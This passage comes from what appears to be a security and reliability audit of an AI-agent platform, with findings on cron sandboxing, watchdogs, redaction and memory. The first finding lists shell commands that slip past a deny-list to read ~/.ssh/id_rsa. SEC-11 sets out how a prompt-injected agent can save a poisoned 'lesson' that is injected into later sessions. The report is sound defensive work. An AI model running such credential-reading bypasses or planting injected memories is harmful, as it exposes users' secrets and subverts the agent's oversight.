- **Evidence (at `397f4be`):**
  - src/kiro_crew/cron_script.py:2985-2995 — 'mode="cc" ... deliberately leaving ~/.ssh reachable ... the residual .ssh exposure is covered by the storage-time deny-list (mcp_cron._vet_shell_command, which blocks any .ssh reference) — the primary control'
  - src/kiro_crew/cron_script.py:3010 — `sandboxed_argv, sandbox_cleanup = wrap_argv(argv, mode="cc")`
  - src/kiro_crew/mcp_cron.py:984-994 — 'sh does NOT let a leading `*`/`?`/`[` match a leading dot' -> such windows are skipped
  - src/kiro_crew/mcp_cron.py:1248 _vet_shell_command; :909 _glob_could_reach_credentials
  - ran: vet=pass and run=ok printing FAKE_SSH_PRIVATE_KEY for bash -O dotglob, shopt -s dotglob, GLOBIGNORE=x, python3 -c (runtime-built path); find ~ -name id_rsa -exec cat {} + also printed the key
  - ran: vet=DENY for `cat ~/.ssh/id_rsa` and `cat ~/.s?h/id_rsa`
  - src/kiro_crew/config/defaults.json:22-38 — allowedTools lists cron_list/pause/resume/trigger/remove but not cron_add
  - AGENTS.md 'A regex spelling-chase is a review smell' and 'The sandbox's SCOPE is the operator's to widen, never yours'
  - …and 3 more in the verification results.
- **Checked by:** ran-new-script
- **Required outcome:** DECISION NEEDED (operator / security owner): whether cron shell commands may read ~/.ssh. The fix is NOT another vet pattern (dotglob, shopt, GLOBIGNORE, find, interpreters form an unbounded set). Options: (a) run cron commands at a tier that hides ~/.ssh (strict, keeping known_hosts), with git-over-SSH crons served by the opt-in SSH_AUTH_SOCK forward (keystone consent ssh_auth_sock_consent.json) or a per-job operator grant. This tightens the fence and is a take-away change for existing SSH crons. (b) Accept parity with the agent's own standard-tier shell, which already reads ~/.ssh (SEC-5), and correct the code comment and spec so the vet is described as an accident rail, not the control. Whichever is chosen, the code and docs stop claiming a text matcher is the primary control for a path.
- **Solution:**
  1. Correct the comment at cron_script.py:2985-2995 and the matching text in the cron spec (learn-cron-dashboard.md) now, independent of the decision.
  2. Raise options (a)/(b) with the owner, citing #17311.
  3. If (a): change run_command_sandboxed's tier (cron_script.py:3010) to one that hides ~/.ssh. Thread the existing forward_ssh_auth_sock decision so consenting operators keep SSH auth through the agent socket rather than key files. Record it in docs/decisions and follow take-away-changes.md (the Reader: list names SSH-using cron owners).
  4. Do not add dotglob/shopt/GLOBIGNORE handling to _glob_could_reach_credentials.
- **Done when:** For (a): a test (Linux namespace or macOS seatbelt, skipped where no backend exists) runs run_command_sandboxed("bash -O dotglob -c 'cat ~/*/id_rsa'") in a throwaway HOME with a fake key and asserts the key bytes are absent from the output, and that ssh known_hosts is still readable. For (b): a doc test or grep asserting the 'primary control' wording is gone from cron_script.py.
- **Upstream:** #17311 (state unverified)
- **Changed from the source claim:** Confirmed by running the vet and the real cc sandbox. Widened: shopt, GLOBIGNORE, find and interpreter-built paths bypass the vet too, so the defect is the text-gate-as-control design, not the dotglob rule. Severity assigned 45 (raised from 40 for the macOS ~/.aws reach), scope armed (needs an approved cron_add; promptless only under auto-approve or yolo). The source's 'treat dotglob as may-match' fix is rejected as a spelling chase. Negative control added: the sandbox is active on the test host. On macOS the same bypass also reaches ~/.aws, via the Seatbelt cc capability gap.
- **Second reader:** security-rules check: agreed.
- **Sources:** verification_needed:Part3(#17311)

### REL-15 [40, default, effort M] Opaque MCP tool read as WORKING is never cut off before the 4 h turn ceiling (by design) — PARTLY

> **COMPLETED** — verified fixed on `main` by code read (no tests run): be05d445a: `watchdog.tool_working_opaque_cap_secs` (service_sections.py) bounds opaque-MCP WORKING deferral; session_handle.py reclassifies to UNKNOWN past the cap; shell children and wait tool unchanged   Default 7200 s is half the 14400 s turn ceiling; "well…
- **Original claim:** Tool watchdog never bounds a WORKING verdict for opaque MCP tools (corrected below)
- **Verified claim:** For an opaque (non-shell, non-wait) MCP tool the liveness oracle reads WORKING whenever ANY CPU/IO counter moved anywhere in the runtime's whole descendant tree (every MCP server under that kiro-cli, not just the one serving the call), and both WORKING branches in AcpSessionHandle defer with no ceiling, so a lost result frame keeps the call open until the turn ceiling. The ceiling is agent.chat_turn_timeout_secs, default 14400 s (4 h, clamp 300 s..24 h), not 2 h; tool_stall_hard_cap_secs (7200 s) bounds only UNKNOWN verdicts. The no-ceiling WORKING behaviour is documented as intentional ('WORKING tools ... are never cancelled regardless of duration'), so the fix is a policy change, not a missed branch.
- **Evidence (at `397f4be`):**
  - src/kiro_crew/acp/session_handle.py:4431 — `if verdict == VERDICT_WORKING: tool_moved_ts = time.monotonic(); self._log_working_deferral(...); continue`
  - src/kiro_crew/acp/session_handle.py:4610 — stale-clock branch `if verdict == VERDICT_WORKING: self._log_working_deferral(_stale_idle, evidence, timeout); continue`
  - src/kiro_crew/acp/liveness.py:1383-1388 — 'Opaque MCP tool: any CPU/IO movement in the runtime's descendant tree ... reads WORKING'; :1925 _tree_movement sums counters over iter_descendants(root_pid)
  - src/kiro_crew/acp/liveness.py:1238 — the kirocrew-core wait tool alone gets a declared-seconds bound (WAIT_TOOL_MAX_SECS + slack)
  - src/kiro_crew/config/service_sections.py:238-252 tool_stall_suspect_secs help — 'WORKING tools (a matched live build child, an MCP subtree with CPU movement) are never cancelled regardless of duration'; :259 hard cap 'Applies ONLY to UNKNOWN verdicts'
  - src/kiro_crew/config/sections.py:1581-1582 — chat_turn_timeout_secs default=14400; :3617-3618 CHAT_TURN_TIMEOUT_MIN=300, MAX=86400
- **Checked by:** read
- **Required outcome:** An opaque MCP tool call whose result frame never arrives is failed and routed to the existing non-lethal tool-stall recovery within a bounded, configurable time well inside the turn ceiling, without cancelling legitimately long tools that have their own declared bound (wait) or attributable evidence (matched shell child).
- **Solution:**
  1. Add an opaque-MCP WORKING ceiling (new watchdog field, e.g. tool_working_opaque_cap_secs, default inside the turn ceiling, clamped to <= tool_stall_hard_cap_secs) in AcpSessionHandle's watchdog config (session_handle.py:293-294) and config/service_sections.py.
  2. In both branches (:4431, :4610), when the in-flight tool is opaque (not tool.is_shell, not a wait tool) and time since dispatch exceeds the cap, fall through to the existing UNKNOWN/tool-stall recovery instead of `continue`.
  3. Optionally narrow the evidence: attribute movement to the serving MCP server's subtree when the server pid is known, instead of the whole runtime tree (liveness.py:1385).
  4. Update the tool_stall_suspect_secs help text and docs/system-specs/modules/acp-client.md in the same commit (the help currently promises 'never cancelled regardless of duration' — a take-away change, so add a Reader: entry per take-away-changes.md).
- **Done when:** Session-handle test with an injected oracle that always returns (VERDICT_WORKING, 'mcp subtree active') for an opaque tool and an injected monotonic clock: advance past the new cap and assert the tool-stall recovery path runs (session/cancel or continue-nudge observed) exactly once; with the clock below the cap assert no action; for a wait tool and a matched shell child assert behaviour is unchanged.
- **Upstream:** #17065 (state unverified)
- **Changed from the source claim:** Bound is the 4 h default turn ceiling (configurable 300 s–24 h), not 2 h; the unbounded WORKING deferral is documented as deliberate, and the movement evidence covers the whole runtime tree, which makes WORKING easier to read than the claim implies.
- **Sources:** verify_needed:G13(#17065)

### SEC-11 [40, default, effort M] Lessons reach session-start context unreviewed; learn_add pre-approved beside web_fetch — PARTLY

> **COMPLETED** — decided by the operator: option (b), framing-only. Recorded in `docs/decisions/2026-10-07-lessons-advisory-provenance.md`. Option (c), removing `learn_add` from the default approvals, was not taken, so `learn_add` stays pre-approved by design.
- **Original claim:** Externally sourced lessons auto-admitted into prompt context (corrected below)
- **Verified claim:** The mechanism holds but the pointer is mis-scoped. The per-turn path the claim cites (_TURN_LESSONS_MAX = 3 / 2,000 chars in context_assembly/store_admission.py) is OFF by default (memory.inject_lessons_per_turn = False). The live default exposure is the session-start lessons block (memory.inject_lessons = True). Lessons reach the store with no human review gate from: the agent's own learn_add MCP tool, history consolidation's LLM extraction from the chat, task-runner extraction, and onboarding import. Skills, by contrast, stage under .pending. On the default main agent both web_fetch and the whole @kirocrew-core server (which carries learn_add) are in allowedTools, so a prompt-injected agent can persist a 'lesson' without any approval prompt, and it is injected into later sessions. The only gate is governance `capabilities.memory_writes`, whose catalog default is permitted. Automatic writers cannot overwrite a human NOT-clause (learn.py save vs save_or_enrich), and vector rows carry a `source` tag (e.g. 'consolidation'), but nothing withholds an untrusted-provenance lesson from injection.
- **Evidence (at `397f4be`):**
  - src/kiro_crew/context_assembly/store_admission.py:40-41 `_TURN_LESSONS_MAX = 3`, `_TURN_LESSONS_CHARS = 2_000`; :103-104 returns '' unless cfg.memory.inject_lessons_per_turn
  - src/kiro_crew/config/memory_sections.py:244-250 inject_lessons default=True (session-start block); :251-260 inject_lessons_per_turn default=False
  - src/kiro_crew/config/defaults.json:22-38 — allowedTools includes "web_fetch" and "@kirocrew-core" (learn_add is a kirocrew-core tool, mcp_core.py:11)
  - src/kiro_crew/mcp_core.py:1240-1283 _vet_memory_writes_governance — only gate on learn_add; platform/governance.py:1389 `capabilities.memory_writes: ScopeSpec(CAPABILITY, capability_default=True)`
  - src/kiro_crew/learn.py:325-338 LessonStore.save — automatic writers (consolidation, task-runner extraction, onboarding import) insert directly; only NOT-clause enrichment is reserved to explicit refinement
  - src/kiro_crew/history_consolidation.py:1725-1746 — LLM extraction of 'lessons' from the conversation; :2490-2530 writes with source='consolidation'
  - src/kiro_crew/taskrunner.py:2642-2721 _extract_lesson -> lesson_store.save
- **Checked by:** read
- **Required outcome:** DECISION NEEDED (security owner / product). Whether lessons from writers whose input can carry third-party content (agent learn_add after untrusted tool output, consolidation extraction) are injected immediately or staged for review. Holding auto-written lessons is a take-away change for users who rely on silent learning. Options: (a) a pending-review sink for agent/automatic lessons, mirroring skills' .pending + approve flow, with human-authored lessons (dashboard /api/lessons, `kirocrew learn add`) unchanged; (b) keep auto-admission but render a provenance tag and frame non-human lessons as advisory in the injected block; (c) take learn_add out of the default allowedTools so it prompts under `ask`. Facts the decision relies on hold as stated above.
- **Solution:**
  1. Owner picks (a), (b) or (c). Record the choice in docs/decisions and follow take-away-changes.md for (a)/(c).
  2. For (a): add a `status: pending` (or a separate pending store) set by LessonStore.save when the caller is automatic or agent-originated. Exclude pending rows in session_lessons_part (store_admission.py:298) and turn_lessons_block (:77). Add approve/reject to the Learn dashboard (strings via the i18n catalog).
  3. For (c): drop learn_add from the @kirocrew-core grant in config/defaults.json by listing the other core tools explicitly. Mind conductor_agents.py:152/668/846, which also grant @kirocrew-core.
  4. Update memory-skills-hooks.md in the same commit.
- **Done when:** For (a): a unit test writes a lesson through the learn_add MCP handler and through history consolidation, then asserts session_lessons_part does not include it until it is approved, while a lesson added via the /api/lessons route is included immediately. For (c): a spec-materialization test asserts learn_add is not pre-approved in the default kirocrew spec.
- **Changed from the source claim:** [VERIFY] -> PARTLY: the per-turn pointer is off by default; the real default path is the session-start block. Added: learn_add is pre-approved through `@kirocrew-core` in allowedTools next to web_fetch, which is what makes the injection chain promptless. Severity assigned 40.
- **Second reader:** security-rules check: agreed.
- **Sources:** verification_needed:V-7

### SEC-18 [40, default, effort M] Batch redact() quadratic on long eyJ runs freezes the dashboard — CONFIRMED

> **COMPLETED** — fixed on `main` in `fc55dc8` (`fix/redact-jwt-scan-linear`): pass 1 scans two channels merged in the alternation's own order — every other branch as one `finditer`, the multi-segment JWT candidates by index arithmetic over maximal token runs — keeping the JSON-header post-filter and the one-character-on resume byte-identical (differenced over crafted+fuzzed inputs; 80k adversarial 1061 ms → 9 ms). security.md updated in-commit.
- **Verified claim:** Measured: security.redact() is quadratic on a single contiguous base64url run that contains `eyJ` repeatedly (eyJ every 40 chars, no dots or terminators). 10k chars 18 ms, 20k 69 ms, 40k 266 ms, 80k 1.07 s, 160k 4.25 s, about x4 per doubling. redact_credentials alone accounts for it (80k: 1.06 s). Extrapolated to the 512,000-char api_file_read cap that is about 43 s. In api_file_read, `content = redact(content)` runs inline in the async handler, not off-loop, so opening such a file in the dashboard freezes every surface the gateway serves for that long. A single long eyJ run and a dotted eyJ.x.y chain stay linear.
- **Evidence (at `397f4be`):**
  - ran: eyJ-every-40 run: 10k 18.2 ms, 20k 68.9 ms (x3.8), 40k 265.9 ms (x3.9), 80k 1071.9 ms (x4.0), 160k 4.25 s
  - ran: single long eyJ run and dotted chain: linear (80k ~16 ms / ~14 ms)
  - src/kiro_crew/dashboard/handlers/files.py:2156-2159 — `content = redact(content)` inside `async def api_file_read`, with no to_thread
  - src/kiro_crew/dashboard/handlers/files.py:1981 `_FILE_READ_CAP = 512_000`
  - src/kiro_crew/security/redaction.py:186-260 — JWT alternative anchored on `eyJ` with segment-length floors
- **Checked by:** ran-new-script
- **Required outcome:** redact() runs in time linear in its input for every input shape, so redacting a 512 KB payload is bounded in tens of milliseconds. No dashboard handler runs a full-buffer redaction on the event loop.
- **Solution:**
  1. Find the alternative in security/redaction.py's credential pass that rescans from each `eyJ` start inside a contiguous run (the JWT pattern around 186-260 with its lookbehind and segment floors). Make the scan resume after a failed run, for example by matching the whole maximal base64url run once and testing it, rather than retrying the regex at every `eyJ` offset. Upstream PR #14993 ('walk each shell payload once per deny decision', state unverified) is the same family.
  2. Independently, wrap the api_file_read redaction (files.py:2156-2159) in asyncio.to_thread like the sibling office and sheet endpoints, or better, apply the #17298-style treatment shared with SEC-14 (redact a bounded over-read off-loop).
  3. Add a complexity guard test per testing-conventions ('sizing a ReDoS / complexity guard').
- **Done when:** A complexity test feeds redact() eyJ-every-40 runs of 20k and 80k chars and asserts the 80k time is below 6x the 20k time (ratio, not wall-clock, so it is deterministic across machines), with a generous absolute ceiling per testing-conventions. A handler test asserts api_file_read performs redaction off the event loop (patch asyncio.to_thread or assert via a loop-blocking probe seam).
- **Upstream:** #17553 PR #14993 (state unverified)
- **Changed from the source claim:** Shape and constants measured here (the source had the reporter's constant only). The quadratic shape is narrower than 'a long eyJ run': it needs repeated eyJ inside one contiguous run. Added: api_file_read runs redact on the event loop. Severity assigned 40 (default; gateway-wide freeze from opening one crafted file).
- **Second reader:** security-rules check: agreed.
- **Sources:** verification_needed:Part3(#17553), verify_needed:G37

### REL-18 [35, default, effort S] Session RSS ceiling never fires on macOS — CONFIRMED

> **COMPLETED** — covered by open upstream PR #17052 ("measure the session RSS ceiling on macOS"; diff verified: `darwin_footprint_tree_mb` via platform_compat, wired into session_pid + session_cleanup + session.md); not duplicated.
- **Verified claim:** On macOS get_session_rss_mb returns 0 for every process tree (explicit `if sys.platform != "linux": return 0`), and the cleanup sweep's non-Windows path reads /proc statm, which does not exist on macOS, so both the per-session ceiling (session.watchdog_rss_max_mb, opt-in, default 0) and the always-on background-runtime ceiling (BACKGROUND_RSS_FALLBACK_MB = 1536 MiB) never fire on macOS. A macOS-capable tree reading already exists in the codebase (acp/runtime_process_tree._get_rss_tree_mb via proc_phys_footprint_bytes_for_pid) and is not used by these ceilings.
- **Evidence (at `397f4be`):**
  - src/kiro_crew/session_pid.py:5561-5617 get_session_rss_mb — `if sys.platform != "linux": return 0`; docstring: 'macOS has no ctypes-only per-pid RSS path, so it returns 0 and the ceiling stays inert'
  - src/kiro_crew/session_pid.py:5493 _read_rss_pages reads /proc/<pid>/statm, returns 0 on FileNotFoundError
  - src/kiro_crew/session_cleanup.py:745-800 _rss_threshold_check — non-Windows: build_child_map + rss_mb_from_tree (the /proc route)
  - src/kiro_crew/session_background.py:52 BACKGROUND_RSS_FALLBACK_MB = 1536; :902-923 uses self._deps.tree_rss_mb = get_session_rss_mb (session.py:2039); `if rss is None or rss < ceiling: return None`
  - ran rel18_rss.py on darwin with a 200 MB child: get_session_rss_mb(parent)=0, get_session_rss_mb(child)=0; existing acp.runtime_process_tree._get_rss_tree_mb(parent)=267.5 MiB; proc_phys_footprint_bytes_for_pid(child)=206 MiB
- **Checked by:** ran-new-script
- **Required outcome:** On macOS the session RSS ceiling and the background-runtime 1536 MiB ceiling measure the real process-tree footprint (phys_footprint, matching the acp/runtime_process_tree reading) and recycle a tree that exceeds them, exactly as on Linux.
- **Solution:**
  1. In session_pid.get_session_rss_mb (session_pid.py:5561), add a darwin branch that sums proc_phys_footprint_bytes_for_pid over the lineage-validated descendant set (reuse acp/runtime_process_tree._get_rss_tree_mb or move its darwin walk into platform_compat per docs/system-specs/common/platform-compat.md) instead of returning 0.
  2. In session_cleanup._rss_threshold_check (:775-790), route darwin through that tree measure rather than the /proc child map, as Windows already is.
  3. Fix the stale docstring.
  4. Update docs/system-specs/modules/session.md (RSS ceiling) in the same commit; note this ARMS an existing ceiling on macOS (operators with watchdog_rss_max_mb set will start seeing recycles) — list it as a behaviour change.
- **Done when:** Darwin-only test (skipif not darwin): spawn a child that touches 200 MB, assert get_session_rss_mb(parent_pid) >= 150; platform-agnostic unit test with platform_compat.proc_phys_footprint_bytes_for_pid and the descendant walk monkeypatched under sys.platform='darwin' asserting the sum is returned and _rss_threshold_check selects the session as a victim when over the ceiling.
- **Upstream:** #17043 PR #17052 (state unverified)
- **Changed from the source claim:** Adds: the user-facing session ceiling is off by default (0), so the default-on impact is the background runtime's 1536 MiB fallback ceiling being inert on macOS.
- **Sources:** verify_needed:G15(#17043), verify_needed:G37

### REL-22 [35, default, effort S] Mount-source janitor waits for a new session; idle or tmpfs-full hosts never sweep — PARTLY

> **COMPLETED** — fixed on `main` in `9c15511` (`fix/cleanup-loop-boot-start`): the cleanup loop is kicked post-bind from both gateway entrypoints (`_kick_cleanup_loop` in `server_runtime/maintenance.py`); `start_cleanup` idempotent so registration keeps its one-loop guarantee; the per-pass budget unchanged. session.md updated in-commit.
- **Original claim:** Sandbox mount-source janitor never runs without a fresh chat (corrected below)
- **Verified claim:** Narrower than claimed. The kirocrew_sb_<pid>_* mount-source janitor (sandbox_mount_sweep via sandbox.cleanup_stale_sandbox_profiles) runs only inside SessionCleanup's _cleanup_loop — once at loop start, then every tick (<= 300 s) — and that loop is started lazily by _ensure_cleanup_task(), whose only caller is the registration of a NEW session in _get_or_create_impl, after `await provider.start()` succeeds. So it starts with the first new session of ANY kind (a chat, including the default-on eager spawn when a chat slot is created, a subagent, a cron run, a memory consolidation), not only a chat. What does NOT start it: the boot-time background runtime (registered directly into _sessions by session_background._ensure_background) and the warm pool. The real gaps: (1) an idle or headless gateway that creates no new session after boot never sweeps while its background runtime and MCP respawns keep staging entries; (2) a host whose runtime tmpfs is already exhausted cannot successfully start a session (the code's own comment: 'a host in that state cannot spawn an agent AT ALL'), so the janitor that would fix it never starts — a self-locking failure. Each pass is also capped at 10 s. Linux namespace launcher only; the 8,004/7 min rate is reporter-measured, not reproducible on this macOS host.
- **Evidence (at `397f4be`):**
  - src/kiro_crew/session_cleanup.py:1152-1172 _cleanup_loop — 'One reclaim pass at START ... a host in that state cannot spawn an agent AT ALL'; `boot_reclaim = asyncio.create_task(self._sweep_sandbox_artifacts())`; ticks call `await self._sweep_sandbox_artifacts()` (:1205)
  - src/kiro_crew/session_cleanup.py:426-430 start_cleanup — `self.state.cleanup_task = asyncio.create_task(self._owner._cleanup_loop())`
  - src/kiro_crew/session.py:2064-2066 _ensure_cleanup_task -> start_cleanup; only caller: src/kiro_crew/session_allocation.py:2838 (in _get_or_create_impl, after `await provider.start()` at :2623)
  - src/kiro_crew/sandbox.py:8500 cleanup_stale_sandbox_profiles -> :8647 `sandbox_mount_sweep._cleanup_stale_sandbox_mount_sources()`
  - src/kiro_crew/sandbox_mount_sweep.py:540 `_SWEEP_TIME_BUDGET_SECONDS = 10.0`; src/kiro_crew/sandbox_launcher_program.py:987 `launch.src_prefix = "kirocrew_sb_%d_" % os.getpid()`
  - src/kiro_crew/session_pool.py:300-329 start_pool — boot calls `await self._owner._ensure_background()` then `_fill_warm_pool()`; neither calls _ensure_cleanup_task
  - src/kiro_crew/session_background.py:285 _ensure_background -> :368 `self._owner._sessions[background_key] = sess` (direct registration, bypasses _get_or_create_impl)
  - src/kiro_crew/config/sections.py:1947-1948 session.eager_spawn default=True (slot creation pre-creates a session -> _get_or_create_impl -> cleanup loop)
  - …and 1 more in the verification results.
- **Checked by:** read
- **Required outcome:** The runtime-tmpfs mount-source janitor runs from gateway boot on its periodic cadence regardless of whether any new session has been created, so an idle/headless gateway, or one that can no longer spawn, still reclaims dead kirocrew_sb_* entries.
- **Solution:**
  1. Read docs/system-specs/modules/runtime-ownership.md and session.md first (the cleanup loop also owns reapers). 1. Decouple the tmpfs janitor from session registration: start the cleanup loop (or a dedicated janitor task) from gateway boot after the listener binds, alongside the other _kick_* tasks in dashboard/server.py, e.g. call sessions._ensure_cleanup_task() from the startup hook or from session_pool.start_pool. 2. Keep it in the maintenance executor and the 10 s per-pass budget, but re-run sooner when a pass ran out of budget. 3. Document the boot start in session.md in the same commit.
- **Done when:** Test: construct a SessionManager with cleanup_stale_sandbox_profiles stubbed to a counter and the tick interval collapsed, run the gateway boot hook WITHOUT creating any session, and assert the counter increments at least once (wait on an asyncio.Event set by the stub, bounded by wait_for); existing test that creation still ensures exactly one cleanup task stays green.
- **Upstream:** #16887 (state unverified)
- **Changed from the source claim:** Corrected trigger: the janitor starts with the first new session of any kind (eager spawn makes that early on an attended host), not specifically a fresh chat; the boot background runtime does not start it, and on an already-exhausted tmpfs it can never start. Severity lowered from the implied default-on crash to a narrower but self-locking gap.
- **Sources:** verify_needed:G24(#16887), verify_needed:G30(#16887)

### REL-26 [35, default, effort M] File-change snapshots retained in gateway memory per turn — CONFIRMED
- **Verified claim:** Each turn's before/after file snapshots are attached to the assistant message as meta.file_changes and held in the in-memory slot.messages of every loaded tab for the gateway's lifetime; neither the live slot nor a rehydrated one strips them. Growth is now bounded per turn and per slot, not unbounded: one side is capped at 200,000 chars (_truncate_snapshot), a turn at _MAX_TURN_SNAPSHOT_CHARS = 400,000 chars plus one protected entry (so at most ~800K chars plus markers and a path), at most 200 entries, and a slot keeps at most 10,000 messages. One large-file edit therefore pins ~400K chars per turn (≈0.4–1.6 MB depending on string width), multiplied by every open tab's history.
- **Evidence (at `397f4be`):**
  - src/kiro_crew/dashboard/chat_runner.py:1811 `_MAX_SNAPSHOT = 200_000`; :1830 `_MAX_TURN_SNAPSHOT_CHARS = 2 * _MAX_SNAPSHOT` ('The most one turn stores is this budget plus the protected entry'); :1849 `_MAX_TURN_SNAPSHOT_ENTRIES = 200`
  - src/kiro_crew/dashboard/chat_turn/file_changes.py:35 _truncate_snapshot; :278 _apply_turn_snapshot_budget
  - src/kiro_crew/dashboard/chat_runner.py:1961-2125 _flush_file_changes — writes `{"file_changes": fc_list}` into the assistant message meta
  - src/kiro_crew/dashboard/state.py:1465 `_MAX_SLOT_MESSAGES = 10000 # Keep all messages`; :4846 trims only past that count
  - rg 'file_changes' in dashboard/chat_persistence.py: no match — rehydrate keeps meta as stored
- **Checked by:** read
- **Required outcome:** The gateway's resident memory for open tabs does not scale with the total size of historical file snapshots: snapshot bodies of past turns live on disk and are loaded on demand when a diff chip is opened, while the in-memory message keeps only path/line-count metadata.
- **Solution:**
  1. In _flush_file_changes (chat_runner.py:1961), persist the full before/after to the transcript (as today) but keep in slot.messages only {path, added, removed, truncated, ref} where ref locates the persisted row.
  2. Add/extend the diff-chip endpoint to load before/after for (slot, message id, path) from the transcript off-loop.
  3. On rehydrate (chat_persistence._rehydrate_slot_from_history) drop before/after from in-memory meta the same way.
  4. Update docs/system-specs/modules/history.md / session.md for the meta shape in the same commit; the frontend diff view must fetch lazily (website/AGENTS.md).
- **Done when:** Test: drive _flush_file_changes for a turn with one 200K-char before and after, assert the in-memory message meta carries no 'before'/'after' strings (len(json.dumps(meta)) < 4096) and that the diff endpoint returns the original 200K-char sides for that message.
- **Upstream:** #14746 (state unverified)
- **Changed from the source claim:** Per-turn (≈400K chars + one protected entry), per-entry (200) and per-slot (10,000 messages) caps now bound the growth, so it is large but not unbounded; the ~1.6 MB/turn figure is the upper end, depending on string width.
- **Sources:** verify_needed:G28(#14746), verify_needed:G38, verify_needed:G41

### REL-47 [35, default, effort M] Snapshot build/restore, import and cron jobs stage in system temp; memory backups do not — PARTLY
- **Original claim:** Snapshots/backups/imports and cron jobs stage data in the system temp dir (corrected below)
- **Verified claim:** Mostly holds. Snapshot creation stages a full clear-text copy of the data home in tempfile.TemporaryDirectory() with no dir= (the system temp dir — tmpfs/RAM on many Linux hosts), and so do snapshot restore (extract) and the portability import (apply_import_zip); cron script jobs get TMPDIR/TMP/TEMP re-pointed to tempfile.gettempdir(), i.e. the gateway's system temp; and `kirocrew doctor` checks only the runtime tmpfs roots used for sandbox mount sources, not the temp dir these stage into. Not true for member-memory backups: member_memory_backup stages its temporary directory inside the chosen output directory (dir=out).
- **Evidence (at `397f4be`):**
  - src/kiro_crew/snapshot.py:631 _build_snapshot -> :697 `with tempfile.TemporaryDirectory() as work:` ('This tree holds the operator's whole data home in the clear while the archive is built')
  - src/kiro_crew/snapshot.py:1556 restore_main -> :1653 `with tempfile.TemporaryDirectory() as work_str:`
  - src/kiro_crew/portability.py:1190 apply_import_zip -> :1272 `with tempfile.TemporaryDirectory() as work_str:`
  - src/kiro_crew/member_memory_backup.py:480 `with tempfile.TemporaryDirectory(prefix="snapshot-", dir=out) as temporary:` (backups stage beside their output)
  - src/kiro_crew/cron_script.py:95-113 _clean_cron_env — present temp keys set to _default_temp_dir() = tempfile.gettempdir() (re-resolved if vanished)
  - src/kiro_crew/doctor_checks/resources.py:179-185 _runtime_tmpfs_roots — sandbox mount-source roots only; cli_doctor.py:1943-1944 'Runtime tmpfs headroom (sandbox mount-source roots; Linux only)'
- **Checked by:** read
- **Required outcome:** Large staging (snapshot build/restore, import) happens on disk-backed storage under the data home (or a configured staging dir) and never in a RAM-backed system temp by default; cron jobs get a disk-backed, per-job temp dir; doctor warns when the effective temp dir is tmpfs with less free space than the data home's size.
- **Solution:**
  1. Add a staging root under the data home (e.g. <KIROCREW_HOME>/tmp/staging, owner-only, excluded from snapshots and swept at boot) and pass dir= it at snapshot.py:697, :1653 and portability.py:1272 (keep restrict_dir_to_owner).
  2. In cron_script._clean_cron_env (cron_script.py:95), point the temp triple at a per-job disk-backed dir under the data home instead of gettempdir(), created and removed around the run.
  3. Add a doctor row in doctor_checks/resources.py: statvfs of tempfile.gettempdir(), flag tmpfs (Linux: /proc/mounts fstype) and free < estimated snapshot size.
  4. The staging dir is a new crew-home leaf holding clear-text data-home copies: test_sandbox_governance_mask.py pins that every crew-home leaf has exactly one disposition (HIDDEN/READONLY/VISIBLE), so the change that creates it must choose one and state why in docs/system-specs/modules/security.md — this record does not prescribe which (AGENTS.md: the sandbox's scope is the operator's to widen).
- **Done when:** Tests: with tempfile.tempdir monkeypatched to a sentinel path, _build_snapshot / restore_main / apply_import_zip create their work dir under <KIROCREW_HOME>/tmp/staging (assert via a recorded TemporaryDirectory dir argument) and never under the sentinel; _clean_cron_env returns TMPDIR under the data home; the doctor check reports a warning for a fake statvfs/mount table saying tmpfs with 1 GB free.
- **Upstream:** #17125 #17124 #17126 (state unverified)
- **Changed from the source claim:** Backups (member memory) already stage beside their output; snapshot build/restore, import and cron temp confirmed; the tmpfs-RAM risk applies where the system temp is tmpfs (common on Linux, not macOS).
- **Sources:** verification_needed:Part3(#17125/#17124/#17126)

### SEC-13 [35, default, effort M] Streaming redaction holdback too short for long key-anchored values — CONFIRMED

> **COMPLETED** — fixed on `main` in `776f6fa` (`fix/stream-holdback-escalation`): an over-cap credential-class run is itself STRONG (escalates to the 4096 ceiling, fails closed past it like Bearer/JWT); a JSON-quoted PEM body is held across escaped line breaks and marker-phrase spaces, with an in-progress END marker holding like the BEGIN one. security.md updated in-commit.
- **Verified claim:** Measured with the real StreamRedactor. For a key=value-anchored secret longer than _STREAM_HOLDBACK_MAX (512), such as `password=<600..6000 chars>`, `{"client_secret": "<...>"}` or `api_key: <...>`, streamed in 7-char chunks (and 64-char chunks from ~1000 chars up), parts of the secret reach the stream output unredacted. Batch redact() of the same text redacts it fully. `Authorization: Bearer <...>` and long JWTs (3.3k and 6.3k chars) are NOT leaked: those 'strong anchors' already get the fail-closed sticky discard and the 4096 JWT ceiling. Separately, a realistic GCP service-account JSON (private_key with JSON-escaped \n line breaks, so each 64-char PEM line is under the bound) leaks 3 of 24 PEM body lines through the stream at every chunk size, while batch redaction leaks none. Correction to the claim: the leak flows from model OUTPUT to live surfaces (dashboard websocket, Slack/messaging streaming, side panels), not 'to the model'. The persisted copy gets a final full-text pass.
- **Evidence (at `397f4be`):**
  - src/kiro_crew/security/__init__.py:442 `_STREAM_HOLDBACK_MAX = 512`; :458 `_STREAM_HOLDBACK_JWT_MAX = 4096`
  - src/kiro_crew/security/__init__.py:681-700 — cap raised and sticky discard armed only when `strong_anchored` (partial JWT, Bearer, strong token anchor)
  - src/kiro_crew/security/__init__.py:548-557 StreamRedactor docstring: 'A credential is never split across a commit boundary'
  - ran: password=600/1000/3000/6000, json client_secret, api_key: -> stream LEAK at chunk 7 (and chunk 64 from 1000/3000); batch ok
  - ran: Bearer 600..6000 and JWT 3364/6364 -> stream ok at chunks 7/64/300
  - ran: service-account JSON private_key -> stream leaked 3/24 PEM body lines at chunks 7/64/300; batch 0/24
  - users: dashboard/chat_runner.py:8511, :8655; dashboard/chat_threads.py:856; dashboard/handlers/side.py:344; slack/handler_runtime/stream.py:267; messaging/driver.py:561
- **Checked by:** ran-new-script
- **Required outcome:** The streaming path never emits a credential that the batch redactor would redact in the same text, at any chunk size. Where it cannot hold a value long enough to decide, it fails closed (tag and drop), as it already does for Bearer/JWT. The latency-vs-completeness bound is an explicit, documented choice. This is subject consistency between two readers of the same text, not a new secret shape.
- **Solution:**
  1. In StreamRedactor.feed (security/__init__.py:569-757), classify every anchor that the batch redactor's key=value / JSON-key credential rules recognise (the token-param and key-name classes redaction.py already owns) as STRONG, so an over-cap value arms the existing sticky discard instead of committing raw. Reuse the redaction module's own classes (as _STREAM_DISCARD_RUN_RES does), never a parallel regex list.
